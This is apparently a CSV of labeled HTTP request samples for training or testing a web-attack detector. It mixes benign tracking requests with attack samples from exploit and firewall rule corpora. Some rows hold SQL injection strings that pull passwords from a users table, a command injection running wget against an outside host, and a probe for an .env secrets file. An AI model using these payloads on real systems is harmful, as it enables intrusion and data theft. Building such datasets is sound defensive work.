"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"endpoint_shape_hash","9721cade8e4338c51fe376e5","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001550|norm_modsec_learn_000388","GET","/","random=778626183&cv=9&fst=1662367343705&num=1&value=0&label=eWQwCJ76xKYDEOSx3NkD&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg8v0&sendb=1&ig=1&frm=0&url=https%3A%2F%2Fil.iherb.com%2F%3Futm_source%3Delivov"
"endpoint_shape_hash","973249cd8b04deda5c9d575f","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001102|norm_modsec_learn_002854","GET","/","v=eyJpZCI6NDY0MSwiZmwiOnRydWUsImRvbSI6Ind3dy5kYWlseW1haWwuY28udWsiLCJsc28iOm51bGwsInVybCI6Imh0dHBzOi8vd3d3LmRhaWx5bWFpbC5jby51ay9mZW1haWwvYXJ0aWNsZS0xMTIyNjcxMS9MYWR5LUFtZWxpYS1XaW5kc29yLWxvb2tlZC1zb21icmUtYmxhY2stc2FpZC1nb29kYnllLVF1ZWVuLmh0bWwiLCJydXJsIjoiaHR0cHM6Ly93d3cuZGFpbHltYWlsLmNvLnVrL25ld3"
"endpoint_shape_hash","976621af9c8146cb25d53966","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001281|norm_modsec_learn_000758","GET","/","fetch_unseen=true&k=34892ffd-594e-409e-a5b1-d4caa1655e1a"
"endpoint_shape_hash","97718a534048d9dab49569ed","2","0","openappsec_legitimate","normal","norm_legitimate_001512|norm_legitimate_001311","POST","/g/collect","v=2&tid=G-4DGGV4HV95&gtm=45je46q0v888916367za200&_p=1719747653131&gcs=G111&gcd=13t3t3t3t5&npa=0&dma=0&tag_exp=0&gdid=dYmQxMT&cid=259251594.1719747522&ul=en-us&sr=1920x1080&ir=1&uaa=x86&uab=64&uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B126.0.6478.127&uamb=0&uam="
"endpoint_shape_hash","97b77ba20c8edda096954f75","2","0","openappsec_legitimate","normal","norm_legitimate_001422|norm_legitimate_001250","GET","/pagead/landing","gcs=G111&gcd=13t3t3t3t5&tag_exp=0&rnd=1370628916.1719747654&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fcheckout&dma=0&npa=0&gtm=45be46q0v9176148604za200&auid=1339420619.1719747533&did=dYmQxMT&gdid=dYmQxMT&frm=0"
"endpoint_shape_hash","984fe9209c06f21193cbdc2b","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002527|norm_modsec_learn_000818","GET","/","id=G-EF5HNXGZ55&cv=1&v=3&t=t&pid=647299074&rv=880&es=1&e=gtm.timer&eid=80&u=CAAAAAAC&tc=10&z=0"
"endpoint_shape_hash","98b5cc3e2f1e158dc40ad966","2","1","exploitdb","sqli","pos_luongvd_001140|pos_luongvd_001128","GET","/news.asp","id=-1+union+select+1,concat"
"endpoint_shape_hash","9956b030744ad4e35bd88aa3","2","1","exploitdb","sqli","pos_luongvd_000423|pos_luongvd_000424","POST","/login-script-demo/users.php",""
"endpoint_shape_hash","99e29e8f3d21f1c4f31a6e38","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000140|norm_modsec_learn_002461","GET","/","gdpr=0&gdpr_consent=&redir=https%3A%2F%2Fads.stickyadstv.com%2Fuser-registering%3FdataProviderId%3D187%26userId%3D%24%7BTM_USER_ID%7D&_test=Yvox5AAGmVEdRABC"
"endpoint_shape_hash","9ab3a7ddf5f1c613187464b3","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000277|norm_modsec_learn_000278","GET","/","partner=heartsscience&version=1.0&plaid=hsattclaq322tst&payload_campaign_identifier=attq322-wt&payload_timestamp=1022110473&payload_type=online_conversion"
"endpoint_shape_hash","9bdb9eb8c00879d296bc2141","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001276|norm_modsec_learn_000745","GET","/","enrich=false&sdkp=false&k=34892ffd-594e-409e-a5b1-d4caa1655e1a"
"endpoint_shape_hash","9bf75279a03e5525149ee9dd","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000492|norm_modsec_learn_000491","GET","/","type=pc_yt_success&_=1663225454555"
"endpoint_shape_hash","9bf8f1d8d4e5246abc15febb","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000465|norm_modsec_learn_001598","GET","/","tid=2614894126093&pd=%7B%22np%22%3A%22gtm%22%2C%22em%22%3A%226d49520254708dce6cd8831ff1bb12e17c3386a0f81457f202bd30209bdfa174%22%2C%22gtm_aem_configs%22%3A%5B%5D%2C%22md_frequency%22%3A0%7D&cb=1660638357410"
"endpoint_shape_hash","9c44e6f0717a36b8212ecae3","2","1","owasp_modsecurity","owasp_php_injection:933160","pos_owasp_modsec_000939|pos_owasp_modsec_000789","GET","/d_53121ccb","start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o&ylabel&xrange=10:10&yrange=[33:system(%27wget%20http://d2g4pmidip2l0r1p42qgqr1pcphfm3ch9.oast.online%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
"endpoint_shape_hash","9d6e4fda2d9da93185f398d4","2","0","openappsec_legitimate","normal","norm_legitimate_002630|norm_legitimate_002664","GET","/pagead/conversion/693170017/","random=1720598699688&cv=9&fst=1720598699688&num=1&npa=1&label=wqmKCIzrlqMCEOHew8oC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260%2C466465926%2C512247839&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&gclaw=EAIaIQobChMIp-6vxIGchwMVDV1HAR3s0g-0"
"endpoint_shape_hash","9e70c2417e56e2904a534e14","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002172|norm_modsec_learn_002171","GET","/","t=1659539836801&imwidth=90"
"endpoint_shape_hash","9f626c78d0da94ba54e8abc3","2","0","openappsec_legitimate","normal","norm_legitimate_002442|norm_legitimate_002443","GET","/en","curr=USD&utm_source=desktop&utm_medium=-1&utm_campaign=header_transp_buses_link&sub_id=-1-header-transp-buses-link"
"endpoint_shape_hash","9fcabb57f9d88608cc6f1326","2","0","openappsec_legitimate","normal","norm_legitimate_002918|norm_legitimate_002932","GET","/atmgateway/get_portrait.htm","memberId=8pctgRBMALNGZij2iv7GfbLBdpTvWp2h"
"endpoint_shape_hash","9ff7ae3c2271c2c40d34241a","2","0","openappsec_legitimate","normal","norm_legitimate_000667|norm_legitimate_000060","GET","/complete/search","client=chrome-omni&gs_ri=chrome-ext-ansg&xssi=t&q=&oit=0&oft=2&url=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dadidas%26oq%3Dadidas%26gs_lcrp%3DEgZjaHJvbWUqEAgAEAAYgwEY4wIYsQMYgAQyEAgAEAAYgwEY4wIYsQMYgAQyEwgBEC4YgwEYxwEYsQMY0QMYgAQyEAgCEC4YgwEYsQMYgAQY5QQyEAgDEC4YgwEYsQMYgAQY5QQyDQgEEAAYgwEYsQMYgAQy"
"endpoint_shape_hash","a029802f0acf4c148d9c75e1","2","1","exploitdb","sqli|xss","pos_luongvd_000188|pos_luongvd_000189","POST","/wbs/process.php",""
"endpoint_shape_hash","a3be0a03df47733d8a152933","2","1","csic_2010","csic_anomalous","pos_csic_001929|pos_csic_001253","GET","/WebSphereSamples/SingleSamples/Increment/increment.html",""
"endpoint_shape_hash","a3f4c85132937f32961bf48e","2","1","exploitdb","sqli","pos_luongvd_001393|pos_luongvd_001396","GET","/index.php","option=com_joomlub&controller=auction&view=auction&task=edit&aid=-2%20union%20all%20select%201,2,3,version"
"endpoint_shape_hash","a51e60f5a4599777c561d640","2","0","openappsec_legitimate","normal","norm_legitimate_000892|norm_legitimate_000944","POST","/horizon/adidasgroup","T=B&u=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&t=1719747531856&v=1719747567578&H=ce438166b0e4c00cb2fc2417&s=aa3bbc1a791d8c7348e559873f77a0d2&f=1719747567577&S=47985&N=107&P=7&z=2"
"endpoint_shape_hash","a5702ed972db32f55a19aa91","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002714|norm_modsec_learn_002711","GET","/","s=980751902&t=7UixaLdyx8Hf4MiH,0.645097891605561&_I=&_AO=0&_NOL=0&_R=https%3A%2F%2Fwww.yahoo.com%2Flifestyle%2Fare-naps-good-for-you-sleep-experts-201947847.html&_K=3.53.38%05_a1s%03d%3DAQABBFW6-GICEKKkXOCv7bEKjYPs_2K4HQkFEgEBAQEL-mICYwAAAAAA_eMAAA%26S%3DAQAAAk-10gLsTR6p8TUzErCQpD4%26j%3DWORLD%04_pl"
"endpoint_shape_hash","a721d45a25bb0d7dcf6980a2","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002554|norm_modsec_learn_001952","GET","/","languageId=-52&productIds=320105286%2C318133954%2C318138951%2C318131485&appId=1"
"endpoint_shape_hash","a768d0dd3397ad7abdd4a9f7","2","0","openappsec_legitimate","normal","norm_legitimate_002588|norm_legitimate_002654","GET","/v3/","tid=2614425740829&event=PageVisit&ed[product_category]=ENTER+DATA+VALUE&ed[product_price]=ENTER+DATA+VALUE&pd[em]=&noscript=1&gtmcb=2063646661"
"endpoint_shape_hash","a8afa7b56698f4953afcce6a","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001274|norm_modsec_learn_001880","GET","/","en=pre_d_eng_tb&tos=1556&scd=12&ssd=1&est=1663673214205&ver=35&isls=true&src=i&invt=1500&rv=1&tim=1663673215761&vi=1663673214201&ri=2a0f545f0a0e02d71ac608f264ebf91b&ref=null&cv=20220918-2-RELEASE&item-url=https%3A%2F%2Fwww.healthline.com%2F"
"endpoint_shape_hash","a970d7a5485dd12a427d3903","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001800|norm_modsec_learn_001190","GET","/","a=nike_prod_fd114306&l=en-US&current_device_time=1660541153&timezone=GMT%2B0300&counter_banner_showed=1&k=SDID&i=com.nike&is_first_visit=false&sdk=WebSDK-v1.3.2&source_url=https%3A%2F%2Fwww.nike.com%2Fil%2Fw%2Fwomens-shoes-5e1x6zy7ok&os=Windows&client_hints=%7B%22architecture%22%3A%22x86%22%2C%22bra"
"endpoint_shape_hash","aac13ea9a5b7dc7fc21c8f8e","2","0","openappsec_legitimate","normal","norm_legitimate_002858|norm_legitimate_002829","GET","/openservice/popularSuggestionViewService","name=home_login_first_screen&bizScene=pcHomeProducts&pageSize=7&showAd=true&position=bottom&callback=jsonp_1728488055737_4537"
"endpoint_shape_hash","ab06bcdd89dda35fabf77b7a","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002661|norm_modsec_learn_002080","GET","/","random=1660222589781&cv=9&fst=1660219200000&num=1&guid=ON&eid=375603260&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=5&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&sendb=1&data=dynx_itemid%3D%3Bdynx_pagetype%3Dsearchresults&frm=0&url=https%3A%2F%2Fwww.weshoes.co.il%2Fhe%2Fcatalogsearch%2Fresult%"
"endpoint_shape_hash","ab363358db7698625838aac4","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000652|norm_modsec_learn_000651","GET","/","access_token=PRESENT&global=GlobalIrisPlayer&client_token=PRESENT&platform_id=7875452810850550039"
"endpoint_shape_hash","abdb0298a48c57221a839f0f","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001512|norm_modsec_learn_000923","GET","/","random=1660641995149&cv=9&fst=1660641995149&num=1&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&eid=376635471&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=1&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa8f0&sendb=1&ig=1&data=event%3Dgtag.config&frm=2&url=https%3A%2F%2Fserver.exposebox.com%2Fdmp%"
"endpoint_shape_hash","ac1e273eae6c22e883da88cf","2","0","openappsec_legitimate","normal","norm_legitimate_001209|norm_legitimate_000851","GET","/cm/p","rand=1719507933697&pnid=140&pcid=a17062c4-e512-400e-bb28-17f2a5176f0a"
"endpoint_shape_hash","ac7348f5f27ccd052207b420","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001123|norm_modsec_learn_001122","GET","/","wklzs=2020&wklz=C4ewVgigvAZgrgOwMbAJYgQMhQZygRgDZCAmAFgFZ8AGMwgZhOs2AC8QpmB3AUwCMcqYDwD6qACZQSADmkBOTACceOEABs4aDATlMAHnMILlMHouWKoXawDoYAQxwALdAgQgAbvZtIQAW2x7NTVUBABzEThFNSgnYGAABxwAUnoAQWSSADFMrOsuO0cXDHcvH39chMUQcThcXIwAWmAnHkbFREaYNXtgRpx7BHEgnEa-UOBMD1RBYBFfEABrVB4oZIB2ACFMkjUEndSMkhI4xJSSCnTM"
"endpoint_shape_hash","ad1da15688fdec7e4471c0e0","2","0","openappsec_legitimate","normal","norm_legitimate_002007|norm_legitimate_002013","POST","/api/cronos/home/GetTopDestinations",""
"endpoint_shape_hash","adbe899e8d8237c3445e983c","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000967|norm_modsec_learn_000968","GET","/","region=1955"
"endpoint_shape_hash","ade4c729b6f264e18d83204b","2","0","openappsec_legitimate","normal","norm_legitimate_002010|norm_legitimate_002009","POST","/api/card/campaigns",""
"endpoint_shape_hash","afd84415291938227fc8e496","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001296|norm_modsec_learn_001295","GET","/","google_gid=CAESENu4KAqR4yWBIvZy-Ns7cgk&google_cver=1&google_push=AehlK4B_hI1Wv56zmZqeTSvp_0ROIhSKp3P3225NgKY96Mu9G2cEDe64NKDcZ7-LRgNMqsm6lrm0kIGkWX-OxGatHP52_PzJ601S"
"endpoint_shape_hash","affb4f8aa02a6bbee9088cda","2","0","openappsec_legitimate","normal","norm_legitimate_002084|norm_legitimate_002299","GET","/td/ga/rul","tid=G-C07L4VP9DZ&gacid=455635995.1720601296&gtm=45je4730v9137961602za200&dma=0&gcd=13l3l3l3l2&npa=0&pscdl=&aip=1&fledge=1&frm=0&z=1949473085"
"endpoint_shape_hash","b082e972c3e3af4ab4076838","2","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_000440|pos_owasp_modsec_002587","GET","/asp.js",""
"endpoint_shape_hash","b09b9ba2114392600d468a32","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002394|norm_modsec_learn_001213","GET","/","client=ca-pub-6109638387739871&plah=wikiway.com"
"endpoint_shape_hash","b142c5a4be436b2a77b0268e","2","0","openappsec_legitimate","normal","norm_legitimate_002650|norm_legitimate_002589","GET","/api/segment","pid=712195&pdata=e%3Dpv%2Cp%3Dweb%2Ctv%3D1x1%2Crefr%3Duntracked%2Cuid%3D1720598677_EAMmRiOTM5NDczMT%2Clys_visit%3Dfalse%2Chlp_learn_more%3Dfalse%2Chlp_visit%3Dfalse%2Cpipk%3Dundefined&gtmcb=1422092147"
"endpoint_shape_hash","b18f60bd16a6108c810e7d52","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000868|norm_modsec_learn_000869","GET","/","org_id=usllpic0&session_id=3c805b531830ad34673f9de6ffffa631"
"endpoint_shape_hash","b1de74568d5e2e83ebeafe68","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002078|norm_modsec_learn_000350","GET","/","random=1660475748131&cv=9&fst=1660475748131&num=1&label=rpmYCNOS3WIQ7tukyQM&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg880&sendb=1&ig=1&frm=0&url=https%3A%2F%2Fwww.payngo.co.il%2Fappliances%2Fcoffee-t"
"endpoint_shape_hash","b1f203a270e2877ffc6a6f31","2","0","openappsec_legitimate","normal","norm_legitimate_000792|norm_legitimate_000796","GET","/eum/results.txt",""
"endpoint_shape_hash","b2a938fe1c4027b2351172e6","2","0","openappsec_legitimate","normal","norm_legitimate_001659|norm_legitimate_001589","POST","/experienceedge/sgp3/v1/collect","configId=0fd7a243-507d-4035-9c75-e42e42f866a0&requestId=45f4afb3-3a66-4d05-9ac5-3dbae672a3bd"
"endpoint_shape_hash","b352127765fc44c81aee4bb7","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001789|norm_modsec_learn_001180","GET","/","a=135092800&sa=1&v=1215.1253ab8&t=Unnamed%20Transaction&rst=69525&ck=1&ref=https://www.nike.com/il/member/profile/login&ri=%7B%22web-shell-client%22:%221.39.0%22,%22shopClient%22:%221.133.0%22%7D"
"endpoint_shape_hash","b46db70a001452dd0304dad2","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002349|norm_modsec_learn_002348","GET","/","_TSM_HiddenField_=XplorerScriptManager_TSM&compress=1&_TSM_CombinedScripts_=%3b%3bSystem.Web.Extensions%2c+Version%3d4.0.0.0%2c+Culture%3dneutral%2c+PublicKeyToken%3d31bf3856ad364e35%3aen-US%3a9ddf364d-d65d-4f01-a69e-8b015049e026%3aea597d4b%3ab25378d2%3bTelerik.Web.UI%2c+Version%3d2020.3.1021.45%2c+"
"endpoint_shape_hash","b4c9f9f77bcc97816ccdc892","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001449|norm_modsec_learn_000917","GET","/","r=https%3A%2F%2Frtb-csync.smartadserver.com%2Fredir%2F%3Fissi%3D1%26partnerid%3D66%26partneruserid%3D%7Bamob_user_id%7D&gdpr=0&gdpr_consent="
"endpoint_shape_hash","b4ff17b7f72e40447bee7f5f","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000398|norm_modsec_learn_002703","GET","/","random=61022608&cv=9&fst=1660559467315&num=1&value=0&label=Cp5KCOGB4sIBEO6b1YsD&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&eid=376635471&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=8&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg880&sendb=1&ig=1&gclaw=Cj0KCQjw3eeXBhD7ARIsAHjssr_Aa4KD5-UWuHrK"
"endpoint_shape_hash","b542a81a1169151e2e9dfa66","2","0","openappsec_legitimate","normal","norm_legitimate_000173|norm_legitimate_002702","POST","/safebrowsing/clientreport/login","key=AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgw"
"endpoint_shape_hash","b542e55eec1ee9052b0f7d19","2","0","openappsec_legitimate","normal","norm_legitimate_000565|norm_legitimate_000590","GET","/resources/pages/account.php","screen=register"
"endpoint_shape_hash","b633139ccc40b29536fdcb95","2","0","openappsec_legitimate","normal","norm_legitimate_002171|norm_legitimate_002102","GET","/action/0","ti=4002941&Ver=2&mid=646ef04a-a6c9-4837-857f-fd99b71e9812&sid=428b9b903e9911efb457efdc28aa456f&vid=428bc2003e9911ef803bad7bacac9344&vids=0&msclkid=N&gc=USD&p=https%3A%2F%2Fwww.agoda.com%2Fstratosphere-hotel-casino-tower-bw-premier-collection%2Fhotel%2Flas-vegas-nv-us.html&sw=1920&sh=1080&sc=24&evt=c"
"endpoint_shape_hash","b6ae2b14fcf74475887c87f2","2","0","openappsec_legitimate","normal","norm_legitimate_001331|norm_legitimate_001106","GET","/track/up","adv=ygdrgdy&ref=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html%3FforceSelSize%3D6.5&upid=186z53b&upv=1.1.0&vf=USD&TD1=SHOPPING%20CART|MINICART%20OVERLAY&TD2=1&TD3=WOMEN&TD4=RUNNING&TD5=PERFORMANCE&TD7=SHOES&TD8=NKE46&TD9=65.00&Geo=US&TD10=11&paapi=1"
"endpoint_shape_hash","b6ced10eb5d05e1f562eec5f","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002382|norm_modsec_learn_002383","GET","/","c=3&cq=256&h=800&m=0&partner=39682&q=80&r=0&u=http%3A%2F%2Fis4.revolveclothing.com%2Fimages%2Fp4%2Fn%2Fd%2FLEIV-WJ268_V1.jpg&v=3&w=800&s=IXMWk2r_dzbxVkgxUWrZU9QT&b=800"
"endpoint_shape_hash","b72097ca088ebc34953924de","2","0","openappsec_legitimate","normal","norm_legitimate_000872|norm_legitimate_000874","GET","/WRSiteInterceptEngine/Asset.php","Module=SI_1HBh4b3ZpUvgHMV&Version=32&Q_ORIGIN=https://www.adidas.com&Q_CLIENTVERSION=2.9.0&Q_CLIENTTYPE=web&Q_BRANDTIER=lIjhYuMl2g&Q_ARCACHEVERSION=21&Q_BRANDDC=fra1"
"endpoint_shape_hash","b76119726959bdde2112b097","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002204|norm_modsec_learn_002205","GET","/","type=host&dsp=69&dspuuid=k-49DRG4Q014jrnwy1x1n9EnQrIG85u8W-SHgNVg"
"endpoint_shape_hash","b7619b10cd1b2f71a72725a3","2","0","openappsec_legitimate","normal","norm_legitimate_001274|norm_legitimate_001192","GET","/embeddedservice/5.0/esw.html","parent=https://www.adidas.com/us/runfalcon-5-running-shoes/IH7760.html"
"endpoint_shape_hash","b77b554dfc98f7e3aa2c91de","2","0","openappsec_legitimate","normal","norm_legitimate_000217|norm_legitimate_000274","POST","/plnext/AADX/Override.action","opt=0:0|c1:0|c3:0&exp=Sun,%2005%20Jan%202025%2018:12:49%20GMT"
"endpoint_shape_hash","b7807b946a0ea4f9779205d3","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001703|norm_modsec_learn_001702","GET","/","v=2&tid=G-04VL5ZQ1FG&gtm=2oe880&_p=142817688&cid=1846042417.1660569669&ul=en-us&sr=1920x1080&_eu=C&_z=ccd.v9B&_s=5&dl=https%3A%2F%2Fksp.co.il%2Fweb%2Fworld%2F13&dr=https%3A%2F%2Fksp.co.il%2Fweb%2F&sid=1660569669&sct=1&seg=1&dt=%D7%9E%D7%95%D7%A6%D7%A8%D7%99%20%D7%94%D7%A4%D7%90%D7%A8%D7%9D%20%D7%A9%"
"endpoint_shape_hash","b78c673f8a96161adbec3217","2","1","csic_2010","csic_anomalous","pos_csic_002546|pos_csic_001464","GET","/4861362529278789730",""
"endpoint_shape_hash","b7c14d69f0ce5da53e84e15e","2","1","csic_2010","csic_anomalous","pos_csic_001101|pos_csic_001107","GET","/tienda1/publico/registro.jsp","modo=registro&login=alteen&password=SemIpleNamente&nombre=Viviana&apellidos=Rigola+Rojo&emailA=paquerette-walmsley%40gspace.no&dni=40627854X&direccion=Josep+Maria+De+Segarra+126%2C+&ciudad=Alzira&cp=34760&provincia=Barcelona&ntc=7818654303045497&B1=Registrar"
"endpoint_shape_hash","b87bafeae4913ad5c06e7929","2","0","openappsec_legitimate","normal","norm_legitimate_002775|norm_legitimate_002715","GET","/global",""
"endpoint_shape_hash","b88bee84aee4ec362f0068e1","2","0","openappsec_legitimate","normal","norm_legitimate_002826|norm_legitimate_002856","GET","/queryNicheMaterial.do","nicheCode=ICBU_PC_TOP_BANNER&callback=jsonp_1728488016934_82350"
"endpoint_shape_hash","b94a3d817f094e2dcf3a6021","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001208|norm_modsec_learn_001209","GET","/","c=ciojs-2.426.0&i=2458e7d9-a9f5-4ec3-bd8a-33fd3108de04&s=1&key=PRESENT&origin_referrer=www.levi.com%2FUS%2Fen_US%2Fdeals%2Fwomen%2Fc%2Flevi_clothing_women_deals_us%2Ffacets%2Fproductitemtype%2Fjeans%2Fproductitemtype%2Ft-shirts%2Fsort%2Fprice-asc&_dt=1660632605134"
"endpoint_shape_hash","bb2f9928c8bfa23714230870","2","0","openappsec_legitimate","normal","norm_legitimate_001240|norm_legitimate_001252","GET","/privacy_sandbox/pixel/register/trigger/","id=3122845081335855&ev=Search&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html&rl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&if=false&ts=1719747629205&cd[content_ids]=%5B%22FV8350%22%2C%22IF9212%22%2C%22JI1250%22%2C%"
"endpoint_shape_hash","bb5ab6e9636b9d9f13d731b9","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002911|norm_modsec_learn_002913","GET","/","xai=AKAOjst4eGhCpFeY_e6gvf20s-VZuQseYlbK3mqWM3pbgC85KNlAUN6Wi1zwHq7EdidTfh8SauKi9aqmqI_oQk5Nvlv9iVQ&sig=PRESENT&cid=CAASFeRoal1XKy-xWGVr7a4mgrVhSrdWcg&id=lidar2&mcvt=1002&p=0,0,600,160&mtos=1002,1002,1002,1002,1002&tos=1002,0,0,0,0&v=20220810&bin=7&avms=nio&bs=0,0&mc=1&if=1&vu=1&app=0&itpl=20&adk=19"
"endpoint_shape_hash","bb949f78f23b6143cb250fb4","2","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_002492|pos_owasp_modsec_002943","GET","/app/.env",""
"endpoint_shape_hash","bc33eb63c8469a711c6ce542","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002541|norm_modsec_learn_002540","GET","/","itok=tAnpFdm9"
"endpoint_shape_hash","bcad197208b5e96aac5eff00","2","1","exploitdb","sqli","pos_luongvd_001905|pos_luongvd_001698","GET","/bannerclick.php","adid=-5+union+select+1,2,concat"
"endpoint_shape_hash","bcd5bee3decc61abeb5267e4","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002318|norm_modsec_learn_001129","GET","/","xai=AKAOjstS6S9prN0_ORnHzPbJeNneyf8XwBXqLpgtBh2Gy9MhZWBjEn_c1z4gPW07-ewyUD20EhkVdvyAV2y_WY6mtnfuMyaG-7a1bP6WWhitg8_ILDeN5Lj_PCQoP2qOgnek8UqCRtmPj0tQf4U1EKWDZa5_wEr6ACvoHYGTn1DFlfaETVHOcMTMvA9C7nkV5zoIRxj9Z5w3s0jRh1mTJrSkk6bd1M7w8kMYU8p3hAesdnD6ZzMfgmrWHUH9QIlCKH3Un2Tb0qaPTzoTkaAmeGWh7PE-rYBEzEocga2A"
"endpoint_shape_hash","be68c16fd62ea7787cc9dc8d","2","1","exploitdb","sqli","pos_luongvd_001502|pos_luongvd_001500","GET","/index.php","option=com_pinboard&Itemid=35&action=showpic&task=-48%20union%20select%201,2,3,4,5,6,password,8,9,10%20from%20jos_users--"
"endpoint_shape_hash","beacb29921569e9cdf65d7a5","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002456|norm_modsec_learn_001890","GET","/","from=criteo&id=k-9uMC9OMxpufyYOmS0T066CazKtMZyc92cb5xoQ"
"endpoint_shape_hash","bf3b95f189711ba96fd4f890","2","1","exploitdb","sqli","pos_luongvd_000127|pos_luongvd_000126","POST","/wp-content/plugins/supportboard/supportboard/include/ajax.php",""
